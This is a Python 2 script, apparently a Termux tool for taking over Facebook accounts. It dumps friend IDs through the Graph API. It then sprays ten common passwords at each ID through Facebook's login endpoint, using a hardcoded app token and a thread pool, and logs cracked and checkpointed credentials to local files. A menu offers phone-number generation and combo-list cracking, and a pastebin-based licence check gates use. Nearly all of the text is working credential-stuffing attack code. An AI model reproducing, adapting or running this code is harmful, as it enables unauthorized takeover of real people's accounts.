        print '\x1b[37;1m [ \xcf\x80 ] Please Fill The Option Input'
        startgrab()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '[ # ] \x1b[37;1mRO\x1b[36;1mMA\x1b[0m'
            anime('\x1b[36;1mDump All Friend \x1b[37;1mID......\x1b[0m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[37;1m[ \xe2\x99\xa4 ] ENTER PUBLIC ID : \x1b[0m')
            print '[ # ] \x1b[37;1mRO\x1b[0m_+_\x1b[31;1MA\x1b[0m'
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[36;1mFacebook Name :  \x1b[37;1m' + op['name'] + '\x1b[0m'
            except KeyError:
                print '\x1b[37;1mInvalid ID /\x1b[0m'
                time.sleep(3)
                graber()

            print '\x1b[34;1mDump All Friends to ID'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
            menu()
        else:
            print '\x1b[37;1mPlease Write A Valid Facebook ID.......\x1b[0m'
            startgrab()
        print '\x1b[36;1m[ \xe2\x99\xa1 ] All Id \x1b[37;1m' + str(len(id)) + '\x1b[0m'
        anime('\x1b[37;1m[ % ] PLEASE WAIT........................')
        titik = ['.', '..', '...', '....', '.....', '......', '.......']
        for o in titik:
            print '\r\x1b[36;1m[ \xe2\x9c\x93 ] CRACKING' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[36;1m Auth : Roma / '
    anime('\x1b[37;1mCRACKING START PLEASE WAIT UNTIL END.........')
    print '\x1b[37;1m=============================================='
    cekpoint = []
    oks = []

    def main(arg):
        global cekpoint
        global oks
        user = arg
        try:
            pass1 = '12345678'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[32;1m HACKED SUCCESS'
                print '\x1b[32;1mID : \x1b[37;1m' + user + '\x1b[0m'
                print '\x1b[32;1mPassword : \x1b[37;1m' + pass1 + '\n' + '\x1b[0m'
                msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass1 + '\n'
                filehack = open('hacked.txt', 'a')
                filehack.write(msghkfile)
                filehack.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[31;1mAccount On Checkpoint'
                print '\x1b[31;1mID : \x1b[37;1m' + user + '\x1b[0m'
                print '\x1b[31;1mPassword : \x1b[37;1m' + pass1 + '\n' + '\x1b[0m'
                cek = open('chkpoint.txt', 'a')
                cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '123123123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                    print '\x1b[32;1mID : \x1b[37;1m' + user
                    print '\x1b[32;1mPassword : \x1b[37;1m' + pass2 + '\n' + '\x1b[0m'
                    msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass2 + '\n'
                    filehack = open('hacked.txt', 'a')
                    filehack.write(msghkfile)
                    filehack.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[31;1mAccount On Checkpoint'
                    print '\x1b[31;1mID : \x1b[37;1m' + user
                    print '\x1b[31;1mPassword : \x1b[37;1m' + pass2 + '\n' + '\x1b[0m'
                    cek = open('chkpoint.txt', 'a')
                    cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = '1122334455'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                        print '\x1b[32;1mID : \x1b[37;1m ' + user
                        print '\x1b[32;1mPassword : \x1b[37;1m' + pass3 + '\n' + '\x1b[0m'
                        msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass3 + '\n'
                        filehack = open('hacked.txt', 'a')
                        filehack.write(msghkfile)
                        filehack.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[31;1mAccount On Checkpoint'
                        print '\x1b[31;1mID : \x1b[37;1m' + user
                        print '\x1b[31;1mPassword : \x1b[37;1m' + pass3 + '\n' + '\x1b[0m'
                        cek = open('chkpoint.txt', 'a')
                        cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = '112233445566'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                            print '\x1b[32;1mID : \x1b[37;1m' + user
                            print '\x1b[32;1mPassword : \x1b[37;1m' + pass4 + '\n' + '\x1b[0m'
                            msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass4 + '\n'
                            filehack = open('hacked.txt', 'a')
                            filehack.write(msghkfile)
                            filehack.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[31;1mAccount On Checkpoint'
                            print '\x1b[31;1mID : \x1b[37;1m' + user
                            print '\x1b[31;1mPassword : \x1b[37;1m' + pass4 + '\n' + '\x1b[0m'
                            cek = open('chkpoint.txt', 'a')
                            cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '1234554321'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                print '\x1b[32;1mID : \x1b[37;1m ' + user
                                print '\x1b[32;1mPassword : \x1b[37;1m' + pass5 + '\n' + '\x1b[0m'
                                msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass5 + '\n'
                                filehack = open('hacked.txt', 'a')
                                filehack.write(msghkfile)
                                filehack.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[31;1mAccount On Checkpoint'
                                print '\x1b[31;1mID : \x1b[37;1m' + user
                                print '\x1b[31;1mPassword : \x1b[37;1m' + pass5 + '\n' + '\x1b[0m'
                                cek = open('chkpoint.txt', 'a')
                                cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '123456654321'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                    print '\x1b[32;1mID : \x1b[37;1m ' + user
                                    print '\x1b[32;1mPassword : \x1b[37;1m' + pass6 + '\n' + '\x1b[0m'
                                    msghkfile = '{ = I F B - R O M A = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass6 + '\n'
                                    filehack = open('hacked.txt', 'a')
                                    filehack.write(msghkfile)
                                    filehack.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[31;1mAccount On Checkpoint'
                                    print '\x1b[31;1mID : \x1b[37;1m' + user
                                    print '\x1b[31;1mPassword : \x1b[37;1m' + pass6 + '\n' + '\x1b[0m'
                                    cek = open('chkpoint.txt', 'a')
                                    cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '12345677654321'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                        print '\x1b[32;1mID : \x1b[37;1m ' + user
                                        print '\x1b[32;1mPassword : \x1b[37;1m' + pass7 + '\n' + '\x1b[0m'
                                        msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass7 + '\n'
                                        filehack = open('hacked.txt', 'a')
                                        filehack.write(msghkfile)
                                        filehack.close()
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[31;1mAccount On Checkpoint'
                                        print '\x1b[31;1mID : \x1b[37;1m' + user
                                        print '\x1b[31;1mPassword : \x1b[37;1m' + pass7 + '\n' + '\x1b[0m'
                                        cek = open('chkpoint.txt', 'a')
                                        cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '11223344556677'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                            print '\x1b[32;1mID : \x1b[37;1m ' + user
                                            print '\x1b[32;1mPassword : \x1b[37;1m' + pass8 + '\n' + '\x1b[0m'
                                            msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass8 + '\n'
                                            filehack = open('hacked.txt', 'a')
                                            filehack.write(msghkfile)
                                            filehack.close()
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[31;1mAccount On Checkpoint'
                                            print '\x1b[31;1mID : \x1b[37;1m' + user
                                            print '\x1b[31;1mPassword : \x1b[37;1m' + pass8 + '\n' + '\x1b[0m'
                                            cek = open('chkpoint.txt', 'a')
                                            cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = '1020304050'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                                print '\x1b[32;1mID : \x1b[37;1m ' + user
                                                print '\x1b[32;1mPassword : \x1b[37;1m' + pass9 + '\n' + '\x1b[0m'
                                                msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass9 + '\n'
                                                filehack = open('hacked.txt', 'a')
                                                filehack.write(msghkfile)
                                                filehack.close()
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[31;1mAccount On Checkpoint'
                                                print '\x1b[31;1mID : \x1b[37;1m' + user
                                                print '\x1b[31;1mPassword : \x1b[37;1m' + pass9 + '\n' + '\x1b[0m'
                                                cek = open('chkpoint.txt', 'a')
                                                cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = '102030405060'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                                    print '\x1b[32;1mID : \x1b[37;1m ' + user
                                                    print '\x1b[32;1mPassword : \x1b[37;1m' + pass10 + '\n' + '\x1b[0m'
                                                    msghkfile = '{ = I F B - B A B Y = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass10 + '\n'
                                                    filehack = open('hacked.txt', 'a')
                                                    filehack.write(msghkfile)
                                                    filehack.close()
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[31;1mAccount On Checkpoint'
                                                    print '\x1b[31;1mID : \x1b[37;1m' + user
                                                    print '\x1b[31;1mPassword : \x1b[37;1m' + pass10 + '\n' + '\x1b[0m'
                                                    cek = open('chkpoint.txt', 'a')
                                                    cek.write('{ = I F B - B A B Y = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + user + '\n[ PASS ] : ' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
        except:
            pass

    p = ThreadPool(15)
    p.map(main, id)
    anime('\x1b[37;1m<<<<<<<<<<<<<<<\\B A B Y/>>>>>>>>>>>>>>>>\x1b[0m')
    print ' '
    print '\x1b[36;1m[ \xe2\x9c\x93 ] CRACKING END' + '\x1b[0m'
    print '\x1b[37;1mREsult \x1b[32;1mOKS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m' + str(len(oks)) + '\x1b[37;1m/' + '\x1b[31;1m' + str(len(cekpoint))
    print ' '
    print ' '
    print logo
    raw_input('[ENTER]')
    time.sleep(3)
    crackfb()


def crackfb():
    os.system('clear')
    print logo
    print ' '
    logomenubar = '              \n  \x1b[37;1m{     I F B - 7 A M A         }\n  \x1b[36;1m===================================\n\n  \x1b[37;1m[ 1 ] Crack List ID with List pwd( No Facebook )\n  [ 2 ] Crack ID:PASS ( No Facebook )\n  [ 3 ] Phone Number Gen ( No Facebook )\n  [ 4 ] Crack PhoneNumber List phone:phone ( No Facebook )\n  [ 5 ] Crack My Friend ( Facebook need )\n  [ 6 ] Crack Public ID ( Facebook need )\n  [ 7 ] Combo maker ( No Facebook )\n  [ 8 ] ID DUMP ( Facebook need )\n  \n  \x1b[36;1m|||||||||||||||||||||||||||||||||||\n  \x1b[0m'
    print logomenubar
    newup = raw_input('\x1b[37;1mIFB : ')
    if newup == '1':
        n1()
    elif newup == '2':
        n2()
    elif newup == '3':
        n4()
    elif newup == '4':
        n5()
    elif newup == '5':
        login()
    elif newup == '6':
        login()
    elif newup == '7':
        n8()
    elif newup == '8':
        n9()
    else:
        crackfb()


def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/pain.txt')
    reb = open('/data/data/com.termux/pain.txt', 'w')
    reb.write(idjscr)
    reb.close()
    chk()


def chk():
    x = os.listdir('/data/data/com.termux/')
    if 'pain.txt' in x:
        os.system('chmod 777 /data/data/com.termux/pain.txt')
        readid = open('/data/data/com.termux/pain.txt', 'r').read()
        print 'Your ID : ' + str(readid)
        textupload = requests.get('https://pastebin.com/raw/qeaGnWMP').text
        if readid in textupload:
            print '\x1b[37;1mYour ID is Active....\x1b[0m'
            time.sleep(5)
            os.system('chmod 000 /data/data/com.termux/pain.txt')
            crackfb()
        else:
            os.system('chmod 000 /data/data/com.termux/pain.txt')
            print "\x1b[37;1mYour ID Isn't Active....."
            time.sleep(5)
            sys.exit()
    else:
        idcr()


if __name__ == '__main__':
    print logo
    chk()